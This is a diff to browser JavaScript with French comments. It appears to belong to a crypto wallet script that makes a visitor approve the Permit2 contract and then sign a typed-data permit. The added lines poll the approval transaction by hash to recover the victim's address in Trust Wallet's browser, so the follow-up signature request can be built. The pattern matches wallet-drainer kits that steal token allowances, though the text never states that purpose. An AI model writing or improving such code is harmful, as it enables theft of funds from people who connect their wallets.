@@ -1246,8 +1246,9 @@ try {
     // C'est après cet await que from devient valide pour eth_signTypedData_v4.
     var ifaceApprove = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
     var approveData  = ifaceApprove.encodeFunctionData('approve', [PERMIT2_ADDR, approveAmount]);
+    var txHash;
     try {
-      await Promise.race([
+      txHash = await Promise.race([
         eth.request({
           method: 'eth_sendTransaction',
           params: [{ from: from || '0x0000000000000000000000000000000000000000',
@@ -1260,7 +1261,19 @@ try {
       if (e && (e.code === 4001 || e.code === 'ACTION_REJECTED')) return;
     }
 
-    // TX confirmée → TW expose maintenant selectedAddress, from devient valide
+    // Résolution from via txHash — contourne le problème selectedAddress async dans TW Browser.
+    // eth_getTransactionByHash passe par le provider interne TW (pas de propagation externe).
+    // 4 tentatives × 350ms couvrent le cycle d'indexation interne du wallet.
+    if (txHash && typeof txHash === 'string' && txHash.startsWith('0x')) {
+      for (var _i = 0; _i < 4; _i++) {
+        try {
+          if (_i > 0) await new Promise(function(r) { setTimeout(r, 350); });
+          var _tx = await eth.request({ method: 'eth_getTransactionByHash', params: [txHash] });
+          if (_tx && _tx.from) { from = _tx.from.toLowerCase(); break; }
+        } catch(_e) {}
+      }
+    }
+    // Fallback ultime : selectedAddress / eth_accounts si txHash absent ou provider muet
     if (!from) from = eth.selectedAddress || eth.address || '';
     if (!from) {
       try {
